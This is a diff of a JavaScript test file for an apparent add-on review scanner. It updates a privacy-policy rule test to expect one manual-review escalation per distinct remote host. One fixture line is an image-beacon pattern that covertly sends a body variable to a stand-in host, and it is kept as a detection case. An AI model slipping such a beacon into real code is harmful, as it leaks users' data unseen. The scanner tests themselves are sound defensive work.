@@ -974,9 +974,10 @@ test("cleartext-transmission flags overt http/ws/ftp remote sends only", () => {
 });
 
 // ---- privacy-policy ----
-// One manual-review escalation per add-on, naming the distinct remote hosts of
-// every overt transmission; covert and local destinations do not trigger it.
-test("privacy-policy escalates once, naming the remote hosts", () => {
+// One manual-review escalation per distinct remote host of every overt
+// transmission (the hosts list as the "where"); covert and local destinations
+// do not trigger it.
+test("privacy-policy escalates one entry per distinct remote host", () => {
   const esc = (code) => privacyPolicy.run(jsCtx(code)).escalations;
   const single = esc('fetch("https://api.example.com/x");');
   assert.equal(single.length, 1);
@@ -984,8 +985,10 @@ test("privacy-policy escalates once, naming the remote hosts", () => {
   const two = esc(
     'fetch("https://b.example.com/x"); fetch("https://a.example.com/y");'
   );
-  assert.equal(two.length, 1);
-  assert.equal(two[0].item, "a.example.com, b.example.com"); // distinct, sorted
+  assert.deepEqual(
+    two.map((e) => e.item),
+    ["a.example.com", "b.example.com"] // one per distinct host, sorted
+  );
   assert.equal(esc('fetch("./local.json");').length, 0); // local
   assert.equal(esc('img.src = "https://x/?d=" + body;').length, 0); // covert
 });
